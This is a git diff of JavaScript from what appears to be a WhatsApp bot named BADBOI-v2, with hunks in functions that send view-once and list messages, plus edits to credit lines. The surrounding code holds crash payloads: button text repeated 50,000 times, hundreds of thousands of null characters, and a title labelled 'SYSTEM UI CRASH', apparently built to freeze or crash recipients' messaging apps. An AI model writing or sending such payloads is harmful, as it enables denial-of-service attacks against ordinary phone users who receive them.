@@ -203,7 +203,7 @@ async function sendViewOnceMessages(jid, count) {
             'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
               'buttons': [{
                 'name': "cta_url",
-                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
               }],
               'messageParamsJson': "\0".repeat(100000)
             })
@@ -256,8 +256,8 @@ async function sendListMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'listMessage': {
       'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
-      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
-      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
       'buttonText': null,
       'listType': 2,
       'productListInfo': {
@@ -1305,7 +1305,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
 𝐂𝐑𝐄𝐃𝐈𝐓𝐒
 
 𝐁𝐀𝐃𝐁𝐎𝐈-𝐯𝟐
-𝐋𝐎𝐑𝐃 𝐄𝐌𝐏𝐄𝐑𝐎𝐑
+𝐋𝐎𝐑𝐃 NO NAME
 𝐋𝐎𝐑𝐃 𝐓𝐊𝐌
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`,
@@ -2426,7 +2426,7 @@ ${readmore}
 
 𝐁𝐀𝐃-𝐁𝐎𝐈
 
-𝐋𝐎𝐑𝐃 𝐄𝐌𝐏𝐄𝐑𝐎𝐑
+𝐋𝐎𝐑𝐃 NO NAME 
 
 𝐋𝐎𝐑𝐃 𝐓𝐊𝐌
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`
